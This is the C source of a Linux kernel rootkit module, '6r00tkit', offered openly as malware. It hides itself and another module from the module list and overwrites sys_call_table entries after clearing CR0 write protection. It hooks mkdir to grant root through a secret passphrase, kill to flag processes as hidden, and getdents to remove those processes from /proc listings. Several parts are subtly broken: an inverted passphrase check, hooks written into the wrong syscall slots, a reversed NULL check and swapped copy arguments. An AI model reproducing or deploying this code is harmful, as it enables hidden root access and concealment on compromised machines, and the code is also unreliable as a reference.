#include <linux/fs.h>
#include <linux/list.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/dirent.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/processor.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#include <linux/proc_ns.h>
#include <linux/fdtable.h>
#include <linux/compiler.h>
#include <linux/syscalls.h>
#include <linux/moduleparam.h>

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
#endif

MODULE_LICENSE("GPL");
MODULE_AUTHOR("MauriceLambert");
MODULE_DESCRIPTION("The 6r00tkit - Rootkit by MauriceLambert");
MODULE_VERSION("0.0.1");

/*
    Defines "command line" arguments for rootkit.
*/
static char *modulename = "groot";
module_param(modulename, charp, 0000);
MODULE_PARM_DESC(modulename, "Module name to hide");

static char *passphrase = "1 4m 6r00t";
module_param(passphrase, charp, 0000);
MODULE_PARM_DESC(passphrase, "Passphrase to get root permissions from mkdir");

static long int killcode = 14600;
module_param(killcode, long, 0000);
MODULE_PARM_DESC(killcode, "Kill signal to hide process from kill");


/*
    Defined structures not in kernel headers.
    https://elixir.bootlin.com/linux/v5.15.137/source/fs/readdir.c#L207
*/
struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char            d_name[1];
};

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

/*
    Define the mkdir syscalls signatures.
*/
#ifdef PTREGS_SYSCALL_STUBS
typedef asmlinkage long (*getdents64_signature)(const struct pt_regs *);
typedef asmlinkage int (*getdents_signature)(const struct pt_regs *);
typedef asmlinkage long (*mkdir_signature)(const struct pt_regs *);
typedef asmlinkage long (*kill_signature)(const struct pt_regs *);
#else
typedef asmlinkage long (*getdents64_signature)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
typedef asmlinkage int (*getdents_signature)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);
typedef asmlinkage long (*mkdir_signature)(const char __user *pathname, umode_t mode);
typedef asmlinkage long (*kill_signature)(pid_t pid, int sig);
#endif

getdents64_signature getdents64_base;
getdents_signature getdents_base;
mkdir_signature mkdir_base;
kill_signature kill_base;

/*
    This function search a module by name.
*/
struct module *get_module_from_list(void) {
    struct list_head *pos;
    struct module *mod;

    list_for_each(pos, &THIS_MODULE->list) {
        mod = container_of(pos, struct module, list);

        if (strcmp(mod->name, modulename) == 0) {
            printk(KERN_INFO "Module found: %s\n", mod->name);
            return mod;
        }
    }

    printk(KERN_INFO "Don't find module: %s\n", mod->name);
    return NULL;
}

/*
    This function hides this rootkit and an other module
    defined by command line argument.
*/
void protect_and_hide(void) {
    struct module *module_to_hide = get_module_from_list();

    if (module_to_hide != NULL) {
        printk(KERN_INFO "Protect module: %s\n", module_to_hide->name);
        try_module_get(module_to_hide);
        printk(KERN_INFO "Hide module: %s\n", module_to_hide->name);
        list_del(&module_to_hide->list);
    }

    printk(KERN_INFO "Protect rootkit\n");
    try_module_get(THIS_MODULE);
    printk(KERN_INFO "Hide rootkit\n");
    list_del(&THIS_MODULE->list);
}

/*
    This function changes the CR0 registry value
    used to defined kernel characteristics.
*/
inline void cr0_write(unsigned long cr0) {
    unsigned long __force_order;
    asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}

/*
    This function sets the write memory protection.
*/
void memprotect(unsigned int protect) {
    unsigned long cr0 = read_cr0();
    if (protect) {
        set_bit(16, &cr0);
    } else {
        clear_bit(16, &cr0);
    }
    cr0_write(cr0);
}

/*
    This function sets roots permissions.
*/
void set_root_permissions(void) {
    struct cred *credentials = prepare_creds();

    if (credentials == NULL) return;

    credentials->uid.val = credentials->gid.val = 0;
    credentials->euid.val = credentials->egid.val = 0;
    credentials->suid.val = credentials->sgid.val = 0;
    credentials->fsuid.val = credentials->fsgid.val = 0;

    commit_creds(credentials);
}

/*
    This function hooks mkdir to get roots permissions
    when use a secret passphrase.
*/
#ifdef PTREGS_SYSCALL_STUBS
asmlinkage int mkdir_hook(const struct pt_regs *regs) {
    const char __user *pathname = (char *)regs->di;
#else
asmlinkage long mkdir_hook(const char __user *pathname, umode_t mode) {
#endif

    if (strcmp(passphrase, pathname)) {
        set_root_permissions();
    } else {
#ifdef PTREGS_SYSCALL_STUBS
        mkdir_base(regs);
#else
        mkdir_base(pathname, mode);
#endif
    }

    return 0;
}

/*
    This function searchs process by PID.
*/
struct task_struct *search_process(pid_t pid) {
    struct task_struct *process = current;

    for_each_process(process)
    {
        if (process->pid == pid)
        {
            return process;
        }
    }
    return NULL;
}

/*
    This function sets an unused flags on a process to hide it.
*/
void set_hidden_flags(pid_t pid) {
    struct task_struct *process = search_process(pid);
    process->flags ^= 0x10000000;
}

/*
    This function hooks kill to get an hidden
    process when use a secret code.
*/
#ifdef PTREGS_SYSCALL_STUBS
asmlinkage long kill_hook(const struct pt_regs *regs) {
    pid_t pid = regs->di;
    int signal = regs->si;
#else
asmlinkage long kill_hook(pid_t pid, int signal) {
#endif
    if (signal == 14600) {
        set_hidden_flags(pid);
    } else {
#ifdef PTREGS_SYSCALL_STUBS
        return kill_base(regs);
#else
        return kill_base(pid, signal);
#endif
    }
    return 0;
}

/*
    This function checks for hidden flag on process by PID.
*/
unsigned long int has_hidden_flag(pid_t pid) {
    if (!pid) return 0;
    struct task_struct *process = search_process(pid);
    if (process != NULL) return 0;
    return process->flags & 0x10000000;
}

/*
    This function hooks getdents64 to hide files and directories.
*/
#ifdef PTREGS_SYSCALL_STUBS
asmlinkage long getdents64_hook(const struct pt_regs *regs) {
    int fd = regs->di;
    struct linux_dirent64 __user *directory = (struct linux_dirent64 *)regs->si;
    long int kernel_return = getdents64_base(regs);
#else
asmlinkage long getdents64_hook(unsigned int fd, struct linux_dirent64 *directory, unsigned int count) {
    long int kernel_return = getdents64_base(fd, directory, count);
#endif

    if (kernel_return <= 0) return kernel_return;
    if (current->files->fdt->fd[fd]->f_path.dentry->d_inode->i_ino != PROC_ROOT_INO) return kernel_return;
    
    struct linux_dirent64 *directory_kernel_return = kzalloc(kernel_return, GFP_KERNEL);
    if (directory_kernel_return == NULL) return kernel_return;

    if (copy_from_user(directory_kernel_return, directory, kernel_return)) {
        kfree(directory_kernel_return);
        return kernel_return;
    }

    struct linux_dirent64 *previous_directory;
    unsigned long offset = 0;

    while (offset < kernel_return) {
        struct linux_dirent64 *current_directory = (void *)directory_kernel_return + offset;

        if (has_hidden_flag(simple_strtoul(current_directory->d_name, NULL, 10))) {
            if (current_directory == directory_kernel_return) {
                kernel_return -= current_directory->d_reclen;
                memmove(current_directory, (void *)current_directory + current_directory->d_reclen, kernel_return);
            } else {
                previous_directory->d_reclen += current_directory->d_reclen;
            }
        } else {
            previous_directory = current_directory;
        }

        offset += current_directory->d_reclen;
    }

    copy_to_user(directory_kernel_return, directory, kernel_return);
    kfree(directory_kernel_return);
    return kernel_return;
}

/*
    This function hooks getdents to files and hide directories.
*/
#ifdef PTREGS_SYSCALL_STUBS
asmlinkage int getdents_hook(const struct pt_regs *regs) {
    int fd = regs->di;
    struct linux_dirent __user *directory = (struct linux_dirent *)regs->si;
    int kernel_return = getdents_base(regs);
#else
asmlinkage int getdents_hook(unsigned int fd, struct linux_dirent *directory, unsigned int count) {
    int kernel_return = getdents_base(fd, directory, count);
#endif

    if (kernel_return <= 0) return kernel_return;
    if (current->files->fdt->fd[fd]->f_path.dentry->d_inode->i_ino != PROC_ROOT_INO) return kernel_return;
    
    struct linux_dirent *directory_kernel_return = kzalloc(kernel_return, GFP_KERNEL);
    if (directory_kernel_return == NULL) return kernel_return;

    if (copy_from_user(directory_kernel_return, directory, kernel_return)) {
        kfree(directory_kernel_return);
        return kernel_return;
    }

    struct linux_dirent *previous_directory;
    unsigned long offset = 0;

    while (offset < kernel_return) {
        struct linux_dirent *current_directory = (void *)directory_kernel_return + offset;

        if (has_hidden_flag(simple_strtoul(current_directory->d_name, NULL, 10))) { 
            if (current_directory == directory_kernel_return) {
                kernel_return -= current_directory->d_reclen;
                memmove(current_directory, (void *)current_directory + current_directory->d_reclen, kernel_return);
            } else {
                previous_directory->d_reclen += current_directory->d_reclen;
            }
        } else {
            previous_directory = current_directory;
        }

        offset += current_directory->d_reclen;
    }

    copy_to_user(directory_kernel_return, directory, kernel_return);
    kfree(directory_kernel_return);
    return kernel_return;
}

/*
    This function hooks syscalls.
*/
void *syscall_hooking(unsigned long new_function, unsigned int syscall_number) {
#ifdef KPROBE_LOOKUP
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    printk(KERN_INFO "Register kallsyms_lookup_name\n");
    register_kprobe(&kp);
    printk(KERN_INFO "Get kallsyms_lookup_name address\n");
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    printk(KERN_INFO "Unregister kallsyms_lookup_name\n");
    unregister_kprobe(&kp);
#endif
    printk(KERN_INFO "Get sys_call_table address\n");
    unsigned long *syscall_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

    printk(KERN_INFO "Get syscall address\n");
    void *base = (void *)syscall_table[syscall_number];

    printk(KERN_INFO "Unprotect memory\n");
    memprotect(0);
    printk(KERN_INFO "Set syscall\n");
    syscall_table[syscall_number] = (unsigned long)new_function;
    printk(KERN_INFO "Protect memory\n");
    memprotect(1);

    return base;
}

/*
    This function is launched on module load.
*/
static int __init grootkit_init(void) {
    printk(KERN_INFO "Protect and hide\n");
    protect_and_hide();
    printk(KERN_INFO "mkdir syscall hooking\n");
    mkdir_base = syscall_hooking((unsigned long)mkdir_hook, (unsigned int)__NR_mkdir);
    printk(KERN_INFO "kill syscall hooking\n");
    kill_base = syscall_hooking((unsigned long)kill_hook, (unsigned int)__NR_kill);
    printk(KERN_INFO "getdents64 syscall hooking\n");
    getdents64_base = syscall_hooking((unsigned long)getdents64_hook, (unsigned int)__NR_mkdir);
    printk(KERN_INFO "getdents syscall hooking\n");
    getdents_base = syscall_hooking((unsigned long)getdents_hook, (unsigned int)__NR_kill);
    printk(KERN_INFO "return\n");
    return 0;
}

/*
    This function is launched on module unload.
*/
static void __exit grootkit_exit(void) {
    syscall_hooking((unsigned long)mkdir_base, (unsigned int)__NR_mkdir);
    syscall_hooking((unsigned long)kill_base, (unsigned int)__NR_kill);
}

module_init(grootkit_init);
module_exit(grootkit_exit);